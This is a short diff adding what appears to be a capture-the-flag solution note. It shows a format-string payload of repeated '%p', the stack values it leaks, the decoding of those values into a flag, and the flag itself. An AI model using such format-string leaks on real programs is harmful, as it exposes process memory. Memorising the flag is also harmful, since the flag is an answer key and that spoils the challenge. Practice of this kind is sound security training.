@@ -1,0 +1,21 @@
+input
+%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+
+output
+hello
+0x7ffd5fac9790
+(nil)
+(nil)
+0x6
+0x6
+(nil)
+0x55842cca32a0
+0x77306e7b66746364 w0n{ftcd
+0x646133725f30675f da3r_0g_
+0x30625f656d30735f 0b_em0s_
+0x7f8e00356b30     5k0
+0x7025702570257025  <= 12nd %p is the address of input
+0x7025702570257025
+0x7025702570257025
+
+dctf{n0w_g0_r3ad_s0me_b00k5}
